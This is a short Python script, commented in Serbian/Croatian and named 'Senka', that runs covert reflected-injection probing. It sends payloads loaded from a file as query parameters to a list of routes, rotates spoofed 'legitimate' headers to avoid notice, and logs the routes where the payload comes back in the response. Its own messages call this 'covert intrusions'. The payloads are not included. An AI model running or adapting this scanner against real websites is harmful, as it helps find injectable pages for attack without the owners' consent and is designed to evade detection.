import requests, json, random, time

# Učitavanje stilizovanih payload-a i zaglavlja
with open("senka/stylizovani.json", "r") as f:
    payloads = json.load(f)

with open("senka/legit_headers.json", "r") as f:
    headers_list = json.load(f)

with open("senka/routes.txt", "r") as f:
    routes = [line.strip() for line in f.readlines() if line.strip()]

print("[Senka] Počinjem prikrivene upade...")

for route in routes:
    for payload in payloads:
        url = f"{route}?q={payload}"
        headers = random.choice(headers_list)
        
        try:
            response = requests.get(url, headers=headers, timeout=8)
            log = f"[{response.status_code}] {url}"
            print(log)
            
            if response.status_code == 200 and payload in response.text:
                print(f"[+] Refleksija potvrđena: {payload}")
                with open("senka/log_success.txt", "a") as logf:
                    logf.write(log + "\n")
        except Exception as e:
            print(f"[!] Greška za {url}: {str(e)}")

        time.sleep(1)

print("[Senka] Završeno skeniranje.")
